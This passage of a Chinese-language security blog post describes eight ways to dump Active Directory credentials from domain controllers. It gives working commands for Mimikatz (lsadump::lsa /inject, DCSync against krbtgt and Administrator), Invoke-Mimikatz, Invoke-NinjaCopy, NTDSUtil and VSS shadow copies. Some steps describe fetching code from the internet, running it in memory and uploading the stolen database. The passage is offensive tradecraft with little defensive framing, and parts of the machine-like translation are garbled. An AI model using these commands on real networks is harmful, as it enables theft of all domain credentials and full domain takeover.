<p>那么当一个帐户被授权给域控制器的登录权限时会发生什么？如果该帐户对域控制器具有管理员权限，则在DC上转储证书是不成功的使用，Mimikatz转储所有域凭据，Mimikatz可用于从域控制器转储所有域凭据。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_68e9a202ca794a90da39e00e64ee71bc.png"></p>
<h4 id="1-使用Mimikatz转储LSASS内存（获取域管理员凭据）"><a href="#1-使用Mimikatz转储LSASS内存（获取域管理员凭据）" class="headerlink" title="1.使用Mimikatz转储LSASS内存（获取域管理员凭据）"></a>1.使用Mimikatz转储LSASS内存（获取域管理员凭据）</h4><p>Mimikatz可用于转储LSASS，然后从不同系统上的LSASS.dmp文件中提取登录凭据。在域控制器上，这能够导出域管理员凭据</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_e8826039f5331b75ae80f5fb0842ce9e.png"></p>
<p>使用任务管理器转储LSASS内存（获取域管理员凭据）</p>
<p>一旦LSASS被转储，可以使用Mimikatz从不同系统上的LSASS.dmp文件中提取登录的凭据。</p>
<h4 id="2-使用NTDSUtil（Grab-NTDS-dit文件）创建从媒体安装（IFM）"><a href="#2-使用NTDSUtil（Grab-NTDS-dit文件）创建从媒体安装（IFM）" class="headerlink" title="2.使用NTDSUtil（Grab NTDS.dit文件）创建从媒体安装（IFM）"></a>2.使用NTDSUtil（Grab NTDS.dit文件）创建从媒体安装（IFM）</h4><p>NTDSUtil是用于与AD和 DB（ntds.dit）进行本机配合的命令实用程序，并启用了DCPromo的IFM集创建，IFM与DCPromo一起使用“从媒体安装”，因此正在升级的服务器不需要通过网络从其他DC复制域数据，FM集是在此实例中的c\ temp中创建的NTDS.dit文件副本，</p>
<p>该文件可能会在共享上进行升级以更新DC，或者可能在未升级的新服务器上找到该文件，此服务器可能未正确保护</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_1e50ca8b606ef3efae4c9483b04ff3be.png"></p>
<p>从NTDS.dit文件（和注册表系统配置单元）转储Active Directory域凭据。</p>
<p>一旦攻击者拥有NTDS.dit文件的副本（以及某些注册表项来解密数据库文件中的安全元素），可以提取Active Directory数据库文件中的凭据数据。一旦攻击者从注册表和NTDS.dit fie获取系统配置单元，</p>
<p>以下截图来自一个安装了Impacket python工具：</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_7743c8aa1ab2632b8ddc85e73072a8bc.png"></p>
<p>截至2015年10月，还有一个Windows方法利用PowerShell方法从DSInternals.com的NTDS.dit文件（和注册表系统配置单元）中转储Get-ADDBAccount(<a target="_blank" rel="noopener" href="https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/">https://www.dsinternals.com/en/dumping-ntds-dit-files-using-powershell/)的凭据(虽然它仅适用于Windows</a>的凭据(虽然它仅适用于Windows) 8和Windows Server 2012及更早版本，因为Windows版本较早）。</p>
<h4 id="3-使用VSS卷影副本远程拉取ntds-dit（通过WMI或PowerShell-Remoting）"><a href="#3-使用VSS卷影副本远程拉取ntds-dit（通过WMI或PowerShell-Remoting）" class="headerlink" title="3.使用VSS卷影副本远程拉取ntds.dit（通过WMI或PowerShell Remoting）"></a>3.使用VSS卷影副本远程拉取ntds.dit（通过WMI或PowerShell Remoting）</h4><p>Windows有一个名为WMI的内置管理组件，可实现远程执行（需要管理员权限）。WMIC是在远程计算机上执行的WMI命令工具。</p>
<p>Matt Graeber在Black Hat USA 2015（论文，幻灯片和视频）上介绍了如何利用WMI进行攻击方法。马特还在DEF CON 23（视频）与同事交谈，进一步攻击WMI能力（再次在DerbyCon - 视频）</p>
<p>利用WMIC（或PowerShell远程处理）创建（或复制现有的）VSS</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_89b57cf8495dd955afd1c56f332d5c21.png"></p>
<p>一旦VSS快照完成，然后将NTDS.dit文件和System注册表配置单元从VSS复制到DC上的c：驱动器</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_45cbd21a8d8e5bff55684031726734a9.png"></p>
<p>文件位于DC上的c：\ temp文件夹中，将文件复制到本地计算机。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_a5d8d0ce3ebdae118618b4e8456c3ea4.png"></p>
<p>此截图显示攻击者使用Mimikatz发现明文密码。如果我们没有这个，怎么办？</p>
<p>攻击者可以通过与WMIC的Kerberos机票做同样的事情。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_162691ec8d77a66ccc05dfa1aefcd4ad.png"></p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_3aaffc52db5de385e17915daa17dcc22.png"></p>
<h4 id="4-使用PowerSploit的Invoke-NinjaCopy-远程拉出ntds-dit-（需要在目标DC上启用PowerShell远程处理）"><a href="#4-使用PowerSploit的Invoke-NinjaCopy-远程拉出ntds-dit-（需要在目标DC上启用PowerShell远程处理）" class="headerlink" title="4.使用PowerSploit的Invoke-NinjaCopy 远程拉出ntds.dit （需要在目标DC上启用PowerShell远程处理）"></a>4.使用PowerSploit的Invoke-NinjaCopy 远程拉出ntds.dit （需要在目标DC上启用PowerShell远程处理）</h4><p>Invoke-NinaCopy是一个PowerShell项目中的脚本，可以使用PowerShell远程处理（PowerShell远程处理必须在目标DC上启用）从远程计算机复制文件（即使文件被锁定，提供对文件的直接访问）。</p>
<p>命令： Invoke-NinjaCopy -Path“c:\windows\ntds\ ntds.dit”-ComputerName“RDLABDC02”-LocalDestination“c:\temp\ ntds.dit”</p>
<p>以下示例是从互联网下载代码执行Invoke-Ninjacopy，并完全在内存中执行。如果攻击者损坏了域管理员登录的工作站，则此方法将起作用，从而使攻击者能够将Active Directory数据库文件从域控制器复制到工作站，然后上传到Internet。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_fd1231756ccd081c01dc70b84947638d.png"></p>
<p>使用DIT Snapshot Viewer，我们可以验证是否成功获取了ntds.dit文件。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_88b695f7e6130084de9c5ded2c0ea317.png"></p>
<h4 id="5-使用Mimikatz（在DC上）本地转储Active-Directory凭据"><a href="#5-使用Mimikatz（在DC上）本地转储Active-Directory凭据" class="headerlink" title="5.使用Mimikatz（在DC上）本地转储Active Directory凭据"></a>5.使用Mimikatz（在DC上）本地转储Active Directory凭据</h4><p>通常，服务帐户是域管理员（或等效的）的成员，或者域管理员最近登录到计算机上的攻击者转储凭据。使用这些凭据，攻击者可以访问域控制器并获取所有域凭据，包括用于创建Kerberos Golden Tickets的KRBTGT帐户NTLM哈希值。</p>
<p>注意：在DC上本机运行时，有许多不同的工具可以转储AD凭据，我更倾向于Mimikatz，因为它具有广泛的凭据窃取和注入功能（以及更多），可以从各种来源和场景启用凭据转储。</p>
<p>命令：mimikatz lsadump :: lsa / inject exit</p>
<p>在域控制器上运行时，Active Directory域中转储凭证数据。需要管理员访问调试或本地SYSTEM权限</p>
<p>注意：RID 502的帐户是KRBTGT帐户，RID 500的帐户是该域的默认管理员。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_6842a9554ba479b8fe095120b776ad69.png"></p>
<h4 id="6-使用Invoke-Mimikatz（在DC上）本地转储Active-Directory凭据"><a href="#6-使用Invoke-Mimikatz（在DC上）本地转储Active-Directory凭据" class="headerlink" title="6.使用Invoke-Mimikatz（在DC上）本地转储Active Directory凭据"></a>6.使用Invoke-Mimikatz（在DC上）本地转储Active Directory凭据</h4><p>调用-Mimikatz是PowerSploit项目中由乔·比尔莱克（@JosephBialek）创建，其包含了Mimikatz的所有功能。它“利用Mimikatz 2.0和Invoke-ReflectivePEInjection来反射性地将Mimikatz完全存储在内存中。这允许您执行诸如转储凭据的操作，而无需将Mimikatz二进制文件写入到磁盘利。“请注意，PowerSploit框架现在托管在”PowerShellMafia“GitHub中。</p>
<p>此外，如果Invoke-Mimikatz以适当的权限运行并且目标计算机启用了PowerShell Remoting，则可以从其他系统中提取凭据，并远程执行标准Mimikatz命令，而不会在远程系统上丢弃文件。</p>
<p>Invoke-Mimikatz的主要功能：</p>
<p>使用mimikatz从LSASS转储凭证： Invoke-Mimikatz -DumpCreds 使用mimikatz导出所有私人证书（即使它们被标记为不可导出）：Invoke-Mimikatz - DumpCerts 提升在远程计算机上具有调试权限的权限：Invoke-Mimikatz -Command“privilege :: debug exit”-ComputerName“computer1” Invoke-Mimikatz“Command”参数使Invoke-Mimikatz能够运行自定义Mimikatz命令。</p>
<p>命令： Invoke-Mimikatz -Command’”privilege :: debug” “LSADump :: LSA / inject” exit’</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_557b31577ae49d66cf6b4f3e82f3a723.png"></p>
<h4 id="7-用Invoke-Mimikatz（通过PowerShell-Remoting）远程转储Active-Directory凭据"><a href="#7-用Invoke-Mimikatz（通过PowerShell-Remoting）远程转储Active-Directory凭据" class="headerlink" title="7.用Invoke-Mimikatz（通过PowerShell Remoting）远程转储Active Directory凭据"></a>7.用Invoke-Mimikatz（通过PowerShell Remoting）远程转储Active Directory凭据</h4><p>命令： Invoke-Mimikatz -Command“”privilege :: debug“”LSADump：LSA / inject“” - 计算机RDLABDC02.rd.adsecurity.org</p>
<p>该示例是从Internet下载代码执行Invoke-Mimikatz，并完全在内存中执行。如果攻击者损坏了域管理员登录的工作站，则此方案将起作用，从而使攻击者能够获取AD凭据并上传到Internet。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_586ca795fae46d9e759031e0e843480c.png"></p>
<h4 id="8-使用Mimikatz的DCSync-远程转储Active-Directory凭据"><a href="#8-使用Mimikatz的DCSync-远程转储Active-Directory凭据" class="headerlink" title="8.使用Mimikatz的DCSync 远程转储Active Directory凭据"></a>8.使用Mimikatz的DCSync 远程转储Active Directory凭据</h4><p>2015年8月添加到Mimikatz的一个主要功能是“DCSync”，其有效地“模拟”域控制器并从目标域控制器请求帐户密码数据。DCSync由Benjamin Delpy和Vincent Le Toux编写。</p>
<p>DCSync之前的漏洞利用方法是在域控制器上运行Mimikatz或Invoke-Mimikatz以获取KRBTGT密码哈希来创建黄金门票。使用Mimikatz的DCSync和适当的权限，攻击者可以通过从网络域控制器中提取密码散列以及以前的密码散列，而无需交互式登录或复制Active Directory数据库文件（ntds.dit）。</p>
<p>运行DCSync需要特殊权限，管理员，域管理员或企业管理员以及域控制器计算机帐户的任何成员都可以运行DCSync来提取密码数据，请注意，默认情况下不仅能读取域控制器还可以为用户提供密码数据。</p>
<p>DCSync如何运行：</p>
<p>发现指定域名中的域控制器。 请求域控制器通过GetNCChanges复制用户凭据（利用目录复制服务（DRS）远程协议） 作者以前已经为域控制器复制做了一些数据包捕获，并确定了域控制器如何复制的内部DC通信流程。 Samba Wiki描述了DSGetNCChanges功能：</p>
<p>“客户端DC向服务器发送DSGetNCChanges请求，当第一个请求从第二个请求获取AD对象更新。响应包含客户端必须应用于其DC副本的一组更新。… 当DC接收到DSReplicaSync请求时，对于从其复制的每个DC（存储在RepsFrom数据结构中），它执行周期复制，其类似在客户端中并使DSGetNCChanges请求该DC。所以它从复制的每个DC中获取最新的AD对象。“</p>
<p>DCSync选项：</p>
<p>/user - 用户id或要使用的用户SID。 /domain（可选） - Active Directory域的FQDN。Mimikatz将发现域中的DC连接。如果未提供此参数，则Mimikatz默认为当前域。 /dc（可选） - 指定要让DCSync连接到并收集数据的域控制器。 DCSync命令示例：</p>
<p>在rd.adsecurity.org域中提取KRBTGT帐户密码数据： Mimikatz “privilege :: debug” “lsadump :: dcsync /domain:rd.adsecurity.org / user：krbtgt” exit</p>
<p>在rd.adsecurity.org域中提权管理员用户密码数据： Mimikatz “privilege :: debug” “lsadump :: dcsync /domain:rd.adsecurity.org / user：Administrator” exit</p>
<p>在lab.adsecurity.org域中提取出ADSDC03域控制器中计算机帐户的密码数据： Mimikatz “privilege :: debug” “lsadump :: dcsync /domain:lab.adsecurity.org / user：adsdc03 $” exit</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_0cc14231b21faee27dc1892aec81bc76.png"></p>
<p>如果该帐户启用“可逆加密”，则显示明文密码。</p>
<p><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/upload_23078d311500b2b50d683325934eb97b.png"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Jindom</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://blog.jinzz.cc/54a54b32a7f3/">https://blog.jinzz.cc/54a54b32a7f3/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://blog.jinzz.cc" target="_blank">Jindom's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="/images/cover9.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/57793b1394cf/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover10.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Nginx启用Alt-Svc加速网站访问速度</div></div></a></div><div class="next-post pull-right"><a href="/1fc49bae5dd1/"><img class="next-cover" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover16.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Jindom</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">125</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">15</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/jindom"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/jindom" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:jinzz@jinzz.cc" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#AD%E6%8B%BF%E5%9F%9F%E6%8E%A7%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.</span> <span class="toc-text">AD拿域控的几种方法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-SYSVOL%E5%92%8C%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%AD%E7%9A%84%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96"><span class="toc-number">1.1.</span> <span class="toc-text">1.SYSVOL和组策略中的密码获取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE%EF%BC%9A"><span class="toc-number">1.1.1.</span> <span class="toc-text">安全建议：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-AD%E5%9F%9F%E6%8E%A7%E4%B8%8A%E7%9A%84MS14-068-Kerberos%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">2.AD域控上的MS14-068 Kerberos漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows%E7%B3%BB%E7%BB%9F%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-number">1.2.0.1.</span> <span class="toc-text">Windows系统具体步骤如下：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Kali%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4%E5%A6%82%E4%B8%8B"><span class="toc-number">1.2.0.2.</span> <span class="toc-text">Kali具体步骤如下</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E5%85%B7%E4%BD%93%E6%AD%A5%E9%AA%A4"><span class="toc-number">1.2.0.3.</span> <span class="toc-text">MSF具体步骤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%99%85%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">1.2.0.4.</span> <span class="toc-text">实际利用过程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE"><span class="toc-number">1.2.1.</span> <span class="toc-text">安全建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-Kerberos-TGS%E7%A5%A8%E7%A6%BB%E7%BA%BF%E7%A0%B4%E8%A7%A3%EF%BC%88Kerberoast%EF%BC%89"><span class="toc-number">1.3.</span> <span class="toc-text">3.Kerberos TGS票离线破解（Kerberoast）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE%EF%BC%9A-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">安全建议：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E6%8E%A7%E7%A5%A8%E6%8D%AE%E5%87%AD%E8%AF%81%E7%9A%84%E7%9B%97%E5%8F%96"><span class="toc-number">1.4.</span> <span class="toc-text">域控票据凭证的盗取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96Active-Directory%E6%95%B0%E6%8D%AE%E5%BA%93%E6%96%87%E4%BB%B6%EF%BC%88ntds-dit%EF%BC%89%E7%9A%84%E8%AE%BF%E9%97%AE%E6%9D%83%E9%99%90"><span class="toc-number">1.5.</span> <span class="toc-text">获取Active Directory数据库文件（ntds.dit）的访问权限</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%AE%EF%BC%9A-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">安全建议：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BD%BF%E7%94%A8Mimikatz%E8%BD%AC%E5%82%A8LSASS%E5%86%85%E5%AD%98%EF%BC%88%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%87%AD%E6%8D%AE%EF%BC%89"><span class="toc-number">1.5.1.1.</span> <span class="toc-text">1.使用Mimikatz转储LSASS内存（获取域管理员凭据）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E4%BD%BF%E7%94%A8NTDSUtil%EF%BC%88Grab-NTDS-dit%E6%96%87%E4%BB%B6%EF%BC%89%E5%88%9B%E5%BB%BA%E4%BB%8E%E5%AA%92%E4%BD%93%E5%AE%89%E8%A3%85%EF%BC%88IFM%EF%BC%89"><span class="toc-number">1.5.1.2.</span> <span class="toc-text">2.使用NTDSUtil（Grab NTDS.dit文件）创建从媒体安装（IFM）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8VSS%E5%8D%B7%E5%BD%B1%E5%89%AF%E6%9C%AC%E8%BF%9C%E7%A8%8B%E6%8B%89%E5%8F%96ntds-dit%EF%BC%88%E9%80%9A%E8%BF%87WMI%E6%88%96PowerShell-Remoting%EF%BC%89"><span class="toc-number">1.5.1.3.</span> <span class="toc-text">3.使用VSS卷影副本远程拉取ntds.dit（通过WMI或PowerShell Remoting）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E4%BD%BF%E7%94%A8PowerSploit%E7%9A%84Invoke-NinjaCopy-%E8%BF%9C%E7%A8%8B%E6%8B%89%E5%87%BAntds-dit-%EF%BC%88%E9%9C%80%E8%A6%81%E5%9C%A8%E7%9B%AE%E6%A0%87DC%E4%B8%8A%E5%90%AF%E7%94%A8PowerShell%E8%BF%9C%E7%A8%8B%E5%A4%84%E7%90%86%EF%BC%89"><span class="toc-number">1.5.1.4.</span> <span class="toc-text">4.使用PowerSploit的Invoke-NinjaCopy 远程拉出ntds.dit （需要在目标DC上启用PowerShell远程处理）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E4%BD%BF%E7%94%A8Mimikatz%EF%BC%88%E5%9C%A8DC%E4%B8%8A%EF%BC%89%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%82%A8Active-Directory%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.1.5.</span> <span class="toc-text">5.使用Mimikatz（在DC上）本地转储Active Directory凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-%E4%BD%BF%E7%94%A8Invoke-Mimikatz%EF%BC%88%E5%9C%A8DC%E4%B8%8A%EF%BC%89%E6%9C%AC%E5%9C%B0%E8%BD%AC%E5%82%A8Active-Directory%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.1.6.</span> <span class="toc-text">6.使用Invoke-Mimikatz（在DC上）本地转储Active Directory凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7-%E7%94%A8Invoke-Mimikatz%EF%BC%88%E9%80%9A%E8%BF%87PowerShell-Remoting%EF%BC%89%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%82%A8Active-Directory%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.1.7.</span> <span class="toc-text">7.用Invoke-Mimikatz（通过PowerShell Remoting）远程转储Active Directory凭据</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#8-%E4%BD%BF%E7%94%A8Mimikatz%E7%9A%84DCSync-%E8%BF%9C%E7%A8%8B%E8%BD%AC%E5%82%A8Active-Directory%E5%87%AD%E6%8D%AE"><span class="toc-number">1.5.1.8.</span> <span class="toc-text">8.使用Mimikatz的DCSync 远程转储Active Directory凭据</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/333a4773e2de/" title="Hi Hexo!"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hi Hexo!"/></a><div class="content"><a class="title" href="/333a4773e2de/" title="Hi Hexo!">Hi Hexo!</a><time datetime="2021-06-03T16:00:00.000Z" title="发表于 2021-06-04 00:00:00">2021-06-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/57793b1394cf/" title="Nginx启用Alt-Svc加速网站访问速度"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Nginx启用Alt-Svc加速网站访问速度"/></a><div class="content"><a class="title" href="/57793b1394cf/" title="Nginx启用Alt-Svc加速网站访问速度">Nginx启用Alt-Svc加速网站访问速度</a><time datetime="2021-02-20T00:00:00.000Z" title="发表于 2021-02-20 08:00:00">2021-02-20</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/54a54b32a7f3/" title="AD拿域控权限的方法整理"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="AD拿域控权限的方法整理"/></a><div class="content"><a class="title" href="/54a54b32a7f3/" title="AD拿域控权限的方法整理">AD拿域控权限的方法整理</a><time datetime="2020-10-26T00:00:00.000Z" title="发表于 2020-10-26 08:00:00">2020-10-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/1fc49bae5dd1/" title="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover16.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署"/></a><div class="content"><a class="title" href="/1fc49bae5dd1/" title="Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署">Cobalt Strike TeamServer CloudFlare HTTPS 防溯源部署</a><time datetime="2020-09-24T00:00:00.000Z" title="发表于 2020-09-24 08:00:00">2020-09-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/f5858198c6fa/" title="蓝队实战笔记"><img src= "data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs=" data-lazy-src="/images/cover7.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="蓝队实战笔记"/></a><div class="content"><a class="title" href="/f5858198c6fa/" title="蓝队实战笔记">蓝队实战笔记</a><time datetime="2020-08-15T00:00:00.000Z" title="发表于 2020-08-15 08:00:00">2020-08-15</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;1949 - 2021 By Jindom</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
